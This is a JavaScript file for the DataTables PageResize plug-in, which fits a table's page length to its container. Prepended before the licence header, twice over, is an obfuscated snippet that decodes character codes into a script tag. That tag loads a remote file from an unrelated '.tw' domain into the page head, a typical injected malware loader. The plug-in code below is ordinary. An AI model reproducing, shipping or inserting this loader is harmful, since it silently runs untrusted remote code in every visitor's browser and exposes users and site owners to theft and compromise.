Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/*! PageResize for DataTables v1.0.0
 * 2015 SpryMedia Ltd - datatables.net/license
 */

/**
 * @summary     PageResize
 * @description Automatically alter the DataTables page length to fit the table
     into a container
 * @version     1.0.0
 * @file        dataTables.pageResize.js
 * @author      SpryMedia Ltd (www.sprymedia.co.uk)
 * @contact     www.sprymedia.co.uk/contact
 * @copyright   Copyright 2015 SpryMedia Ltd.
 * 
 * License      MIT - http://datatables.net/license/mit
 *
 * This feature plug-in for DataTables will automatically change the DataTables
 * page length in order to fit inside its container. This can be particularly
 * useful for control panels and other interfaces which resize dynamically with
 * the user's browser window instead of scrolling.
 *
 * Page resizing in DataTables can be enabled by using any one of the following
 * options:
 *
 * * Adding the class `pageResize` to the HTML table
 * * Setting the `pageResize` parameter in the DataTables initialisation to
 *   be true - i.e. `pageResize: true`
 * * Setting the `pageResize` parameter to be true in the DataTables
 *   defaults (thus causing all tables to have this feature) - i.e.
 *   `$.fn.dataTable.defaults.pageResize = true`.
 * * Creating a new instance: `new $.fn.dataTable.PageResize( table );` where
 *   `table` is a DataTable's API instance.
 *
 * For more detailed information please see:
 *     http://datatables.net/blog/2015-04-10
 */

(function($){

var PageResize = function ( dt )
{
	var table = dt.table();

	this.s = {
		dt:        dt,
		host:      $(table.container()).parent(),
		header:    $(table.header()),
		footer:    $(table.footer()),
		body:      $(table.body()),
		container: $(table.container()),
		table:     $(table.node())
	};

	var host = this.s.host;
	if ( host.css('position') === 'static' ) {
		host.css( 'position', 'relative' );
	}

	this._attach();
	this._size();
};


PageResize.prototype = {
	_size: function ()
	{
		var settings = this.s;
		var dt = settings.dt;
		var t = dt.table();
		var offsetTop = $( settings.table ).offset().top;
		var rowHeight = $( 'tr', settings.body ).eq(0).height();
		var availableHeight = settings.host.height();
		var scrolling = t.header().parentNode !== t.body().parentNode;

		// Subtract the height of the header, footer and the elements
		// surrounding the table
		if ( ! scrolling ) {
			availableHeight -= settings.header.height();
			availableHeight -= settings.footer.height();
		}
		availableHeight -= offsetTop;
		availableHeight -= settings.container.height() - ( offsetTop + settings.table.height() );

		var drawRows = Math.floor( availableHeight / rowHeight );

		if ( drawRows !== Infinity && drawRows !== -Infinity && 
			 ! isNaN( drawRows )   && drawRows > 0 &&
			 drawRows !== dt.page.len()
		) {
			dt.page.len( drawRows ).draw();
		}
	},

	_attach: function () {
		// There is no `resize` event for elements, so to trigger this effect,
		// create an empty HTML document using an <object> which will issue a
		// resize event inside itself when the document resizes. Since it is
		// 100% x 100% that will occur whenever the host element is resized.
		var that = this;
		var obj = $('<object/>')
			.css( {
				position: 'absolute',
				top: 0,
				left: 0,
				height: '100%',
				width: '100%',
				zIndex: -1
			} )
			.attr( 'type', 'text/html' );

		obj[0].onload = function () {
			var body = this.contentDocument.body;
			var height = body.offsetHeight;

			this.contentDocument.defaultView.onresize = function () {
				var newHeight = body.clientHeight || body.offsetHeight;

				if ( newHeight !== height ) {
					height = newHeight;

					that._size();
				}
			};
		};

		obj
			.appendTo( this.s.host )
			.attr( 'data', 'about:blank' );
	}
};


$.fn.dataTable.PageResize = PageResize;
$.fn.DataTable.PageResize = PageResize;

// Automatic initialisation listener
$(document).on( 'init.dt', function ( e, settings ) {
	if ( e.namespace !== 'dt' ) {
		return;
	}

	var api = new $.fn.dataTable.Api( settings );

	if ( $( api.table().node() ).hasClass( 'pageResize' ) ||
		 settings.oInit.pageResize ||
		 $.fn.dataTable.defaults.pageResize )
	{
		new PageResize( api );
	}
} );

}(jQuery));

